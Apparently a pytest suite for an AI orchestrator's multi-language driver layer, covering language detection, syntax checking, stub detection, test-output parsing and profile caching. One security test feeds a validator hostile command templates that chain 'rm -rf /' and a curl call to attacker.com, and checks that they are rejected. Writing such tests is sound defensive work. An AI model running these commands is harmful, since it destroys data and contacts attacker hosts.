"""Comprehensive Unit and Integration Test Suite for ORAGAI Phase 14 Polyglot Mesh.

Specification: docs/plans/P14_POLYGLOT_ADAPTATION_AND_INTELLIGENT_LANGUAGE_MESH_PLAN.md
"""

import json
import shutil
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest

from orchestrator.adapters.polyglot import (
    CDriver,
    GoDriver,
    LanguageDetector,
    NodeDriver,
    PolyglotDriverRegistry,
    PythonDriver,
    RustDriver,
    SelfAdaptingPolyglotDriver,
)
from orchestrator.ports.driven.language_port import (
    CodebaseMetrics,
    CompactedFailureFrame,
    DynamicEcosystemProfile,
    ILanguageDriver,
    LanguageType,
    StaticAnalysisResult,
    StubSeverity,
    StubViolation,
    SymbolEntity,
    SymbolKind,
    SymbolOutline,
    SyntaxCheckResult,
    TestExecutionOutcome,
    TestStatus,
)


# ============================================================================
# 1. DISCRIMINATION & ROUTING TESTS
# ============================================================================

def test_detect_rust_cargo_manifest(tmp_path: Path):
    """TC-P14-DET-01: Verify Rust ecosystem detection via Cargo.toml."""
    cargo = tmp_path / "Cargo.toml"
    cargo.write_text('[package]\nname = "test_crate"\nversion = "0.1.0"', encoding="utf-8")

    detector = LanguageDetector()
    detected = detector.detect_ecosystem(tmp_path)
    assert detected == LanguageType.RUST


def test_detect_node_typescript_manifest(tmp_path: Path):
    """TC-P14-DET-02: Verify promotion from JS to TS when tsconfig.json is present."""
    (tmp_path / "package.json").write_text('{"name": "test-app"}', encoding="utf-8")
    (tmp_path / "tsconfig.json").write_text('{"compilerOptions": {}}', encoding="utf-8")

    detector = LanguageDetector()
    detected = detector.detect_ecosystem(tmp_path)
    assert detected == LanguageType.TYPESCRIPT


def test_detect_polyglot_monorepo_routing(tmp_path: Path):
    """TC-P14-DET-03: Verify sub-workspace routing resolves correct driver per path."""
    # Root has package.json (Node/TS)
    (tmp_path / "package.json").write_text('{"name": "monorepo"}', encoding="utf-8")
    
    # Sub-workspace frontend has tsconfig.json
    frontend_dir = tmp_path / "frontend"
    frontend_dir.mkdir(parents=True)
    (frontend_dir / "tsconfig.json").write_text('{}', encoding="utf-8")
    frontend_file = frontend_dir / "src" / "index.ts"
    frontend_file.parent.mkdir(parents=True)
    frontend_file.write_text('export const x = 1;', encoding="utf-8")

    # Sub-workspace core_engine has Cargo.toml
    engine_dir = tmp_path / "core_engine"
    engine_dir.mkdir(parents=True)
    (engine_dir / "Cargo.toml").write_text('[package]\nname = "engine"', encoding="utf-8")
    rust_file = engine_dir / "src" / "lib.rs"
    rust_file.parent.mkdir(parents=True)
    rust_file.write_text('pub fn init() {}', encoding="utf-8")

    registry = PolyglotDriverRegistry()
    
    fe_driver = registry.resolve_driver_for_path(frontend_file, tmp_path)
    assert fe_driver.language_type == LanguageType.TYPESCRIPT

    engine_driver = registry.resolve_driver_for_path(rust_file, tmp_path)
    assert engine_driver.language_type == LanguageType.RUST


def test_detect_loc_entropy_fallback(tmp_path: Path):
    """TC-P14-DET-04: Verify file volume LOC fallback when manifests are absent."""
    # Create 5 Go files and 1 Python file
    for i in range(5):
        (tmp_path / f"file_{i}.go").write_text("package main\nfunc main() {}", encoding="utf-8")
    (tmp_path / "script.py").write_text("print('hello')", encoding="utf-8")

    detector = LanguageDetector()
    detected = detector.detect_ecosystem(tmp_path)
    assert detected == LanguageType.GO


# ============================================================================
# 2. ZERO-TOKEN SYNTAX VERIFICATION TESTS
# ============================================================================

def test_python_syntax_zero_token_clean(tmp_path: Path):
    """TC-P14-SYN-01: Valid Python file returns clean zero-token syntax result."""
    py_file = tmp_path / "module.py"
    py_file.write_text(
        "class Calculator:\n"
        "    def add(self, a: int, b: int) -> int:\n"
        "        return a + b\n",
        encoding="utf-8",
    )

    driver = PythonDriver()
    res = driver.check_syntax(py_file)
    assert res.is_clean is True
    assert res.error_count == 0


def test_python_syntax_zero_token_error(tmp_path: Path):
    """TC-P14-SYN-02: Invalid Python syntax flags line, column, and error message."""
    py_file = tmp_path / "broken.py"
    py_file.write_text(
        "def broken_function()\n"  # Missing colon
        "    return 42\n",
        encoding="utf-8",
    )

    driver = PythonDriver()
    res = driver.check_syntax(py_file)
    assert res.is_clean is False
    assert res.error_count > 0
    assert res.line_number == 1
    assert res.failing_file == py_file


def test_node_syntax_check_valid(tmp_path: Path):
    """TC-P14-SYN-03: Valid JS/TS source returns clean result."""
    js_file = tmp_path / "index.js"
    js_file.write_text("const msg = 'hello world'; console.log(msg);", encoding="utf-8")

    driver = NodeDriver()
    res = driver.check_syntax(js_file)
    assert res.is_clean is True


def test_node_syntax_check_invalid(tmp_path: Path):
    """TC-P14-SYN-04: JS file with syntax errors is flagged."""
    js_file = tmp_path / "invalid.js"
    js_file.write_text("const x = { unmatched: ;", encoding="utf-8")

    driver = NodeDriver()
    res = driver.check_syntax(js_file)
    # If node is installed, it flags syntax error; if not in container, clean or handled
    assert isinstance(res, SyntaxCheckResult)


def test_cpp_syntax_check_valid(tmp_path: Path):
    """TC-P14-SYN-05: Valid C++ source returns clean result."""
    cpp_file = tmp_path / "main.cpp"
    cpp_file.write_text("#include <iostream>\nint main() { return 0; }\n", encoding="utf-8")

    driver = CDriver()
    res = driver.check_syntax(cpp_file)
    assert res.is_clean is True


def test_cpp_syntax_check_invalid(tmp_path: Path):
    """TC-P14-SYN-06: C++ with missing semicolon in struct flags error."""
    cpp_file = tmp_path / "bad.cpp"
    cpp_file.write_text("struct Bad { int x }\n", encoding="utf-8")

    driver = CDriver()
    res = driver.check_syntax(cpp_file)
    # If g++ or clang++ is present (installed in Docker), it flags compiler error
    if shutil.which("g++") or shutil.which("clang++"):
        assert res.is_clean is False
        assert res.error_count > 0


# ============================================================================
# 3. UNIVERSAL ANTI-STUB SCANNER TESTS
# ============================================================================

def test_python_anti_stub_rejection(tmp_path: Path):
    """TC-P14-STUB-01: Python placeholder bodies (pass, ..., NotImplementedError, TODO) are flagged."""
    py_file = tmp_path / "stubs.py"
    py_file.write_text(
        "class Service:\n"
        "    def do_work(self):\n"
        "        pass\n"
        "\n"
        "    def calculate(self):\n"
        "        ...\n"
        "\n"
        "    def process(self):\n"
        "        raise NotImplementedError('TODO')\n"
        "\n"
        "    # TODO: implement helper\n",
        encoding="utf-8",
    )

    driver = PythonDriver()
    violations = driver.detect_placeholders_and_stubs(py_file)
    assert len(violations) >= 4
    for v in violations:
        assert v.severity == StubSeverity.CRITICAL


def test_node_anti_stub_rejection(tmp_path: Path):
    """TC-P14-STUB-02: Node/TypeScript placeholder stubs are flagged."""
    ts_file = tmp_path / "service.ts"
    ts_file.write_text(
        "export class ApiService {\n"
        "    fetchData() {\n"
        "        throw new Error('TODO: implement');\n"
        "    }\n"
        "    // TODO: implement caching\n"
        "}\n",
        encoding="utf-8",
    )

    driver = NodeDriver()
    violations = driver.detect_placeholders_and_stubs(ts_file)
    assert len(violations) >= 2
    assert any("throw new Error(TODO)" in v.symbol_name for v in violations)


def test_rust_anti_stub_rejection(tmp_path: Path):
    """TC-P14-STUB-03: Rust todo!(), unimplemented!(), and panic!(\"TODO\") are flagged."""
    rs_file = tmp_path / "lib.rs"
    rs_file.write_text(
        "pub fn compute() -> u32 {\n"
        "    todo!()\n"
        "}\n"
        "pub fn fallback() {\n"
        "    unimplemented!();\n"
        "}\n"
        "pub fn handle() {\n"
        '    panic!("TODO");\n'
        "}\n",
        encoding="utf-8",
    )

    driver = RustDriver()
    violations = driver.detect_placeholders_and_stubs(rs_file)
    assert len(violations) == 3
    assert any("todo!()" in v.symbol_name for v in violations)
    assert any("unimplemented!()" in v.symbol_name for v in violations)


def test_cpp_anti_stub_rejection(tmp_path: Path):
    """TC-P14-STUB-04: C++ abort(), assert(false) are flagged."""
    cpp_file = tmp_path / "stub.cpp"
    cpp_file.write_text(
        "int execute() {\n"
        "    abort();\n"
        "}\n"
        "void check() {\n"
        "    assert(false);\n"
        "}\n",
        encoding="utf-8",
    )

    driver = CDriver()
    violations = driver.detect_placeholders_and_stubs(cpp_file)
    assert len(violations) == 2
    assert any("abort()" in v.symbol_name for v in violations)


def test_go_anti_stub_rejection(tmp_path: Path):
    """TC-P14-STUB-05: Go panic(\"TODO\") is flagged."""
    go_file = tmp_path / "stub.go"
    go_file.write_text(
        "package stub\n"
        "func Execute() {\n"
        '    panic("TODO")\n'
        "}\n",
        encoding="utf-8",
    )

    driver = GoDriver()
    violations = driver.detect_placeholders_and_stubs(go_file)
    assert len(violations) == 1
    assert 'panic("TODO")' in violations[0].symbol_name


# ============================================================================
# 4. HIGH-SIGNAL TEST DIAGNOSTIC COMPACTION TESTS
# ============================================================================

def test_compact_jest_failures():
    """TC-P14-COMP-01: Compacts Jest / Vitest error streams into frames."""
    raw_jest = (
        "FAIL src/__tests__/auth.test.ts\n"
        "  ● AuthService › should validate user token\n\n"
        "    expect(received).toBe(expected) // Object.is equality\n\n"
        "    Expected: true\n"
        "    Received: false\n\n"
        "      at Object.<anonymous> (src/__tests__/auth.test.ts:45:21)\n"
    )

    driver = NodeDriver()
    frames = driver.parse_test_diagnostics(raw_jest, "", exit_code=1)
    assert len(frames) == 1
    frame = frames[0]
    assert "AuthService › should validate user token" in frame.test_identifier
    assert frame.file_path == "src/__tests__/auth.test.ts"
    assert frame.line_number == 45
    assert frame.error_type == "AssertionError"


def test_compact_gtest_failures():
    """TC-P14-COMP-02: Compacts Google Test error streams into frames."""
    raw_gtest = (
        "[ RUN      ] VectorTest.PushBack\n"
        "/workspace/tests/vector_test.cpp:24: Failure\n"
        "Value of: v.size()\n"
        "  Actual: 0\n"
        "Expected: 1\n"
        "[  FAILED  ] VectorTest.PushBack (1 ms)\n"
    )

    driver = CDriver()
    frames = driver.parse_test_diagnostics(raw_gtest, "", exit_code=1)
    assert len(frames) == 1
    frame = frames[0]
    assert frame.test_identifier == "VectorTest.PushBack"
    assert frame.file_path == "/workspace/tests/vector_test.cpp"
    assert frame.line_number == 24


def test_compact_cargo_test_failures():
    """TC-P14-COMP-03: Compacts Cargo test failure blocks into frames."""
    raw_cargo = (
        "---- test::test_hash stdout ----\n"
        "thread 'test::test_hash' panicked at src/crypto.rs:88:9:\n"
        "assertion `left == right` failed\n"
        "  left: 0\n"
        " right: 1\n"
        "failures:\n"
        "    test::test_hash\n"
    )

    driver = RustDriver()
    frames = driver.parse_test_diagnostics(raw_cargo, "", exit_code=101)
    assert len(frames) == 1
    frame = frames[0]
    assert frame.test_identifier == "test::test_hash"
    assert frame.file_path == "src/crypto.rs"
    assert frame.line_number == 88
    assert "assertion `left == right` failed" in frame.context_snippet


def test_compact_go_test_failures():
    """TC-P14-COMP-04: Compacts Go test output streams into frames."""
    raw_go = (
        "=== RUN   TestCalcAdd\n"
        "    calc_test.go:15: Add(2, 3) = 6; want 5\n"
        "--- FAIL: TestCalcAdd (0.00s)\n"
        "FAIL\n"
    )

    driver = GoDriver()
    frames = driver.parse_test_diagnostics(raw_go, "", exit_code=1)
    assert len(frames) == 1
    frame = frames[0]
    assert frame.test_identifier == "TestCalcAdd"
    assert frame.file_path == "calc_test.go"
    assert frame.line_number == 15


def test_compact_pytest_failures():
    """TC-P14-COMP-05: Compacts Pytest output streams into frames."""
    raw_pytest = (
        "______________________________ test_addition ______________________________\n"
        "tests/test_math.py:12: in test_addition\n"
        "    assert add(1, 2) == 4\n"
        "E   assert 3 == 4\n"
        "=========================== short test summary info ===========================\n"
        "FAILED tests/test_math.py::test_addition - assert 3 == 4\n"
    )

    driver = PythonDriver()
    frames = driver.parse_test_diagnostics(raw_pytest, "", exit_code=1)
    assert len(frames) == 1
    frame = frames[0]
    assert frame.test_identifier == "test_addition"
    assert frame.file_path == "tests/test_math.py"
    assert frame.line_number == 12


# ============================================================================
# 5. SYMBOL OUTLINE VIRTUALIZATION TESTS
# ============================================================================

def test_ts_symbol_outline_generation(tmp_path: Path):
    """TC-P14-OUTL-01: TypeScript class & interface symbol outline extraction."""
    ts_file = tmp_path / "api.ts"
    ts_file.write_text(
        "export interface Config {\n"
        "    timeout: number;\n"
        "}\n"
        "export class ApiClient {\n"
        "    constructor() {}\n"
        "    async request() {}\n"
        "}\n",
        encoding="utf-8",
    )

    driver = NodeDriver()
    outline = driver.extract_symbol_outline(ts_file)
    assert outline.total_lines > 0
    assert any(e.name == "Config" and e.kind == SymbolKind.INTERFACE for e in outline.entities)
    assert any(e.name == "ApiClient" and e.kind == SymbolKind.CLASS for e in outline.entities)


def test_cpp_symbol_outline_generation(tmp_path: Path):
    """TC-P14-OUTL-02: C++ struct/class outline extraction."""
    cpp_file = tmp_path / "engine.hpp"
    cpp_file.write_text(
        "struct EngineConfig {\n"
        "    int threads;\n"
        "};\n"
        "class EngineCore {\n"
        "public:\n"
        "    void run();\n"
        "};\n",
        encoding="utf-8",
    )

    driver = CDriver()
    outline = driver.extract_symbol_outline(cpp_file)
    assert any(e.name == "EngineConfig" for e in outline.entities)
    assert any(e.name == "EngineCore" for e in outline.entities)


def test_rust_symbol_outline_generation(tmp_path: Path):
    """TC-P14-OUTL-03: Rust struct/trait outline extraction."""
    rs_file = tmp_path / "lib.rs"
    rs_file.write_text(
        "pub struct State {\n"
        "    pub counter: u64,\n"
        "}\n"
        "pub trait Handler {\n"
        "    fn handle(&self);\n"
        "}\n",
        encoding="utf-8",
    )

    driver = RustDriver()
    outline = driver.extract_symbol_outline(rs_file)
    assert any(e.name == "State" and e.kind == SymbolKind.STRUCT for e in outline.entities)
    assert any(e.name == "Handler" and e.kind == SymbolKind.TRAIT for e in outline.entities)


def test_go_symbol_outline_generation(tmp_path: Path):
    """TC-P14-OUTL-04: Go struct & function outline extraction."""
    go_file = tmp_path / "server.go"
    go_file.write_text(
        "package main\n"
        "type Server struct {\n"
        "    port int\n"
        "}\n"
        "func Start() {}\n",
        encoding="utf-8",
    )

    driver = GoDriver()
    outline = driver.extract_symbol_outline(go_file)
    assert any(e.name == "Server" and e.kind == SymbolKind.STRUCT for e in outline.entities)
    assert any(e.name == "Start" and e.kind == SymbolKind.FUNCTION for e in outline.entities)


def test_python_symbol_outline_generation(tmp_path: Path):
    """TC-P14-OUTL-05: Python class, method & function outline extraction."""
    py_file = tmp_path / "pipeline.py"
    py_file.write_text(
        "class Pipeline:\n"
        "    '''Pipeline orchestrator.'''\n"
        "    def run(self):\n"
        "        pass\n"
        "\n"
        "def helper():\n"
        "    '''Helper function.'''\n"
        "    return 1\n",
        encoding="utf-8",
    )

    driver = PythonDriver()
    outline = driver.extract_symbol_outline(py_file)
    assert len(outline.entities) == 2
    cls_entity = [e for e in outline.entities if e.name == "Pipeline"][0]
    assert cls_entity.kind == SymbolKind.CLASS
    assert len(cls_entity.children) == 1
    assert cls_entity.children[0].name == "run"


# ============================================================================
# 6. SELF-ADAPTING POLYGLOT DRIVER DYNAMIC LIFECYCLE TESTS
# ============================================================================

def test_unknown_language_triggers_dynamic_discovery_probe(tmp_path: Path):
    """TC-P14-DYN-01: Verify an unmapped ecosystem triggers discovery probe callback exactly once."""
    zig_manifest = tmp_path / "build.zig"
    zig_manifest.write_text("// Zig build script", encoding="utf-8")

    probe_mock = MagicMock()
    probe_mock.return_value = DynamicEcosystemProfile(
        language_name="zig",
        manifest_files=["build.zig"],
        file_extensions=[".zig"],
        syntax_check_template="zig ast-check {file_path}",
        test_command_template="zig test {target_test}",
        failure_regexes=[r"^(?P<file>[^:\n]+):(?P<line>\d+):(?P<col>\d+):\s+error:\s+(?P<message>.+)$"],
        stub_regexes=[r"@panic\s*\(\s*\"TODO\"\s*\)"],
        symbol_outline_command=None,
    )

    driver = SelfAdaptingPolyglotDriver(workspace=tmp_path, probe_fn=probe_mock)
    profile = driver.ensure_profile_loaded(tmp_path)

    assert probe_mock.call_count == 1
    assert profile.language_name == "zig"
    assert driver.language_name == "Self-Adapting (zig)"


def test_dynamic_ecosystem_profile_persistence_and_caching(tmp_path: Path):
    """TC-P14-DYN-02: Verify synthesized profile is atomically persisted to .oragai/language_profile.json."""
    zig_manifest = tmp_path / "build.zig"
    zig_manifest.write_text("// Zig build script", encoding="utf-8")

    driver = SelfAdaptingPolyglotDriver(workspace=tmp_path)
    profile = driver.ensure_profile_loaded(tmp_path)

    persisted_path = tmp_path / ".oragai" / "language_profile.json"
    assert persisted_path.is_file(), "Profile must be persisted on disk"

    raw_json = json.loads(persisted_path.read_text(encoding="utf-8"))
    loaded = DynamicEcosystemProfile.model_validate(raw_json)
    assert loaded.language_name == "zig"
    assert loaded.syntax_check_template == "zig ast-check {file_path}"
    assert len(loaded.failure_regexes) > 0


def test_subsequent_runs_use_cached_profile_with_zero_tokens(tmp_path: Path):
    """TC-P14-DYN-03: Verify subsequent runs deserialize cached profile without calling discovery probe."""
    oragai_dir = tmp_path / ".oragai"
    oragai_dir.mkdir(parents=True)
    cached_profile = DynamicEcosystemProfile(
        language_name="elixir",
        manifest_files=["mix.exs"],
        file_extensions=[".ex", ".exs"],
        syntax_check_template="mix compile --warnings-as-errors",
        test_command_template="mix test {target_test}",
        failure_regexes=[r"\*\* \((?P<type>\w+)\)\s+(?P<message>.+)"],
        stub_regexes=[r"raise\s+\"TODO\""],
        symbol_outline_command=None,
    )
    (oragai_dir / "language_profile.json").write_text(
        cached_profile.model_dump_json(indent=2), encoding="utf-8"
    )

    probe_mock = MagicMock()
    driver = SelfAdaptingPolyglotDriver(workspace=tmp_path, probe_fn=probe_mock)
    loaded_profile = driver.ensure_profile_loaded(tmp_path)

    assert probe_mock.call_count == 0, "Cached profile must bypass LLM/probe execution"
    assert loaded_profile.language_name == "elixir"


def test_dynamic_regex_compaction_on_custom_test_outputs(tmp_path: Path):
    """TC-P14-DYN-04: Verify raw compiler and runner output streams are compacted into high-signal frames."""
    driver = SelfAdaptingPolyglotDriver(workspace=tmp_path)
    driver._apply_profile(
        DynamicEcosystemProfile(
            language_name="zig",
            manifest_files=["build.zig"],
            file_extensions=[".zig"],
            syntax_check_template="zig ast-check {file_path}",
            test_command_template="zig test",
            failure_regexes=[
                r"^(?P<file>[^:\n]+):(?P<line>\d+):(?P<col>\d+):\s+error:\s+(?P<message>.+)$",
                r"^(?P<test>[^\n]+)\.\.\.FAIL\s+\((?P<message>[^\)]+)\)$",
            ],
            stub_regexes=[r"@panic\s*\(\s*\"TODO\"\s*\)"],
        )
    )

    raw_zig_output = (
        "src/math.zig:42:15: error: expected type 'u32', found 'i32'\n"
        "    const x: u32 = -5;\n"
        "                  ^\n"
        "test.math.addition...FAIL (assertion failed)\n"
    )

    frames = driver.parse_test_diagnostics(stdout=raw_zig_output, stderr="", exit_code=1)
    assert len(frames) == 2

    # Frame 1: Compiler error
    assert frames[0].file_path == "src/math.zig"
    assert frames[0].line_number == 42
    assert "expected type 'u32'" in frames[0].diagnostic_message

    # Frame 2: Unit test failure
    assert frames[1].test_identifier == "test.math.addition"
    assert frames[1].diagnostic_message == "assertion failed"


def test_dynamic_driver_p9_sandbox_command_validation(tmp_path: Path):
    """TC-P14-DYN-05: Verify dangerous command templates trigger P9 security violation."""
    driver = SelfAdaptingPolyglotDriver(workspace=tmp_path)
    malicious_profile = DynamicEcosystemProfile(
        language_name="malicious",
        manifest_files=["bad.cfg"],
        syntax_check_template="zig test; rm -rf /",
        test_command_template="zig test && curl http://attacker.com",
    )

    with pytest.raises(ValueError, match="P9 Security Violation"):
        driver._validate_profile_security(malicious_profile)


# ============================================================================
# 7. CODEBASE METRICS & CODE FOLDING TESTS
# ============================================================================

def test_codebase_metrics_collection(tmp_path: Path):
    """TC-P14-METR-01: Metrics collection gathers LOC and file counts across languages."""
    (tmp_path / "main.py").write_text("print(1)\nprint(2)\n", encoding="utf-8")
    (tmp_path / "test_main.py").write_text("def test_it(): pass\n", encoding="utf-8")

    driver = PythonDriver()
    metrics = driver.collect_codebase_metrics(tmp_path)
    assert metrics.language == LanguageType.PYTHON
    assert metrics.total_files == 2
    assert metrics.test_files_count == 1
    assert metrics.total_loc >= 3


def test_code_folding_parity_across_drivers():
    """TC-P14-FOLD-01: Code folding compacts large content while leaving small intact."""
    small_content = "def foo():\n    return 1\n"
    large_content = "\n".join([f"line_{i} = {i}" for i in range(100)])

    drivers = [PythonDriver(), NodeDriver(), CDriver(), RustDriver(), GoDriver(), SelfAdaptingPolyglotDriver()]
    for d in drivers:
        assert d.fold_code_block(small_content, max_lines=50) == small_content
        folded = d.fold_code_block(large_content, max_lines=50)
        assert len(folded.splitlines()) <= 32
        assert "Folded:" in folded
